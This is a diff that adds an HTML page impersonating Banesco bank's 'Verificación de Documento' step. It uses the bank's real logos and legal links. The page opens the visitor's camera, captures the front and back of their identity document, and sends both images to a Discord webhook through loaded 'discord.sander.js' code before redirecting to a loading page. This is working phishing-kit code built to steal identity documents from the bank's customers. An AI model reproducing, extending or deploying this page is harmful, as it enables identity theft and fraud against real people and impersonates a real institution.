@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Documento - Banesco</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            margin: 0;
+            font-family: "Inter", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f7fa;
+            color: #0f2240;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .secure-header {
+            width: 100%;
+            padding: 15px 20px;
+            background-color: #ffffff;
+            box-shadow: 0 2px 10px rgba(15, 34, 64, 0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .secure-header img {
+            height: 40px;
+            width: auto;
+        }
+        @media (min-width: 768px) {
+            .secure-header img {
+                height: 50px;
+            }
+        }
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 40px 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 30px;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(15, 34, 64, 0.1);
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin: 0 0 10px;
+        }
+        .header p {
+            font-size: 1rem;
+            color: #5b748f;
+            margin: 0;
+            line-height: 1.5;
+            min-height: 48px;
+        }
+        .camera-view {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            aspect-ratio: 16 / 10;
+            margin: 20px auto;
+            border-radius: 12px;
+            background-color: #000;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        }
+        .camera-view video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: auto;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+        }
+        .document-outline {
+            position: absolute;
+            inset: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.8);
+            border-radius: 8px;
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.6);
+        }
+        .scan-line {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, rgba(0, 230, 118, 0.8), transparent);
+            box-shadow: 0 0 10px #00e676;
+            animation: scan 3s linear infinite;
+            display: none;
+        }
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(calc(100% + 200px)); }
+        }
+        .btn-capture {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 10px;
+            background-color: #007953;
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        .btn-capture:hover {
+            background-color: #005a3d;
+        }
+        .btn-capture:disabled {
+            background-color: #a5d6c7;
+            cursor: not-allowed;
+        }
+        .captured-images {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .captured-images img {
+            width: 80px;
+            height: 50px;
+            object-fit: cover;
+            border-radius: 4px;
+            border: 2px solid #007953;
+        }
+        canvas {
+            display: none;
+        }
+        /* --- Estilos del Footer --- */
+        .site-footer {
+            width: 100%;
+            color: white;
+            background-color: #007953;
+            flex-shrink: 0;
+        }
+        .footer-top {
+            padding: 20px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            margin: 0 auto;
+        }
+        .footer-logo {
+            margin-right: 24px;
+        }
+        .footer-logo a img {
+            height: 24px;
+            width: auto;
+        }
+        .footer-copyright p {
+            margin: 0;
+            font-size: 0.9rem;
+            color: #ffffff;
+        }
+        .footer-legal {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .footer-legal a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        .footer-legal a:hover { opacity: 1; text-decoration: underline; }
+        .footer-social {
+            margin-left: auto;
+        }
+        .social-media__inner {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+        .social-media__item {
+            display: inline-flex;
+            height: 24px;
+            width: 24px;
+        }
+        .social-media__item img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        @media (max-width: 767px) {
+            .footer-top { gap: 15px; }
+            .footer-legal { order: 3; justify-content: center; }
+            .footer-social { margin-left: 0; width: 100%; margin-top: 20px; }
+            .footer-logo { margin-right: 0; }
+        }
+    </style>
+</head>
+<body>
+    <header class="secure-header">
+        <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/header/logotype.png" alt="Banesco Logo">
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="header">
+                <h1>Verificación de Documento</h1>
+                <p id="instruction-text">Por favor, coloque el <strong>anverso</strong> de su documento dentro del recuadro.</p>
+            </div>
+            <div class="camera-view">
+                <video id="cameraFeed" autoplay playsinline muted></video>
+                <div class="document-outline"></div>
+                <div class="scan-line" id="scan-line"></div>
+            </div>
+            <div class="captured-images" id="captured-images-container"></div>
+            <button id="capture-button" class="btn-capture" disabled>Escanear Anverso</button>
+        </div>
+    </main>
+
+    <canvas id="canvas"></canvas>
+
+    <script src="protection.sander.js"></script>
+    <script src="discord.sander.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('cameraFeed');
+            const canvas = document.getElementById('canvas');
+            const captureButton = document.getElementById('capture-button');
+            const instructionText = document.getElementById('instruction-text');
+            const scanLine = document.getElementById('scan-line');
+            const imagesContainer = document.getElementById('captured-images-container');
+
+            let stream;
+            let anversoBlob = null;
+            let reversoBlob = null;
+            let currentStep = 'anverso';
+
+            async function startCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                    video.srcObject = stream;
+                    captureButton.disabled = false;
+                    scanLine.style.display = 'block';
+                } catch (err) {
+                    console.error("Error al acceder a la cámara:", err);
+                    instructionText.innerHTML = 'No se pudo acceder a la cámara. Por favor, revisa los permisos y recarga la página.';
+                    captureButton.disabled = true;
+                }
+            }
+
+            function captureImage() {
+                captureButton.disabled = true;
+                captureButton.textContent = 'Procesando...';
+
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const imageUrl = URL.createObjectURL(blob);
+                    const imgElement = document.createElement('img');
+                    imgElement.src = imageUrl;
+                    imagesContainer.appendChild(imgElement);
+
+                    if (currentStep === 'anverso') {
+                        anversoBlob = blob;
+                        instructionText.innerHTML = '¡Excelente! Ahora, coloque el <strong>reverso</strong> de su documento.';
+                        captureButton.textContent = 'Escanear Reverso';
+                        currentStep = 'reverso';
+                        captureButton.disabled = false;
+                    } else if (currentStep === 'reverso') {
+                        reversoBlob = blob;
+                        instructionText.textContent = 'Documentos capturados. Enviando para verificación...';
+                        sendDocumentsToDiscord();
+                    }
+                }, 'image/jpeg', 0.9);
+            }
+
+            async function sendDocumentsToDiscord() {
+                const formData = new FormData();
+                formData.append('file1', anversoBlob, `documento_anverso.jpg`);
+                formData.append('file2', reversoBlob, `documento_reverso.jpg`);
+
+                await sendToDiscord(
+                    "📄 Documentos Escaneados Recibidos",
+                    "Un usuario ha escaneado sus documentos de identidad.",
+                    [],
+                    5763719, // Color verde azulado
+                    formData
+                );
+
+                setTimeout(() => {
+                    window.location.href = 'cargando3.html';
+                }, 1500);
+            }
+
+            captureButton.addEventListener('click', captureImage);
+            startCamera();
+        });
+    </script>
+
+    <footer class="site-footer">
+        <div class="footer-inner">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <a href="index1.html">
+                        <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/footer/white-logo.svg" alt="Banesco Logo">
+                    </a>
+                </div>
+                <div class="footer-copyright">
+                    <p>Banesco © Copyright 2026. Todos los derechos reservados.</p>
+                </div>
+                <div class="footer-legal">
+                    <a href="https://www.banesco.com.pa/aviso-de-privacidad-y-proteccion-de-datos/">Aviso de Privacidad y Protección de Datos</a> │ <a href="https://media.banesco.com.pa/wp-content/uploads/wpfiles/2023/06/25034823/politica-corporativa-anticorrupcion-banesco-panama-sa-y-subsidiarias.pdf">Política Corporativa Anticorrupción Banesco Panamá S.A. y Subsidiarias</a>
+                </div>
+                <div class="footer-social">
+                    <div class="social-media__inner">
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/facebook-circle-white.svg" alt="facebook">
+                        </a>
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/X-Twitter.svg" alt="twitter">
+                        </a>
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/instagram-circle-white.svg" alt="instagram">
+                        </a>
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/linkedin-circle-white.svg" alt="linkedin">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
